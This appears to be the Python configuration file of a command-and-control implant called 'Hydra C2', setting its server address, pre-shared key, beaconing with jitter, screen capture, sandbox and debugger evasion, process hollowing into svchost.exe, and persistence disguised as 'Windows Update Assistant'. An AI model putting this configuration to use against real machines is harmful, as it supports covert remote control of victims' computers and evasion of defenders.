"""
Configuration settings for Hydra C2 client
"""

import os

# C2 server connection details
SERVER_URL = "wss://10.211.55.5:8443/ws/dashboard"
PSK = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"  # Pre-shared key for authentication

# Network settings
CONNECTION_TIMEOUT = 30  # Connection timeout in seconds
RETRY_INTERVAL = 10  # Retry interval in seconds
MAX_RETRIES = 5  # Maximum number of connection retries

# Remote control settings
SCREEN_CAPTURE_QUALITY = 50  # JPEG quality (1-100)
SCREEN_CAPTURE_SCALE = 0.5  # Scale factor for screen captures

# Security settings
ENCRYPTION_ENABLED = True  # Enable encryption for C2 communication
OBFUSCATION_ENABLED = True  # Enable obfuscation for payload

# Anti-analysis settings
ANTI_VM_ENABLED = False  # Enable VM detection
ANTI_DEBUG_ENABLED = False  # Enable debugger detection

# Client configuration
BEACON_INTERVAL = 60  # Seconds between beacons
JITTER = 0.3  # Random jitter factor (0.0 to 1.0)

# Process hollowing configuration
TARGET_PROCESS = r"C:\Windows\System32\svchost.exe"

# Persistence configuration
PERSISTENCE_NAME = "Windows Update Assistant"
PERSISTENCE_METHOD = "registry"  # Options: "registry" or "scheduled_task"

# Anti-analysis settings
SANDBOX_SLEEP = 10  # Seconds to sleep for sandbox detection
VM_DETECT = True    # Enable VM detection
DEBUG_DETECT = True # Enable debugger detection 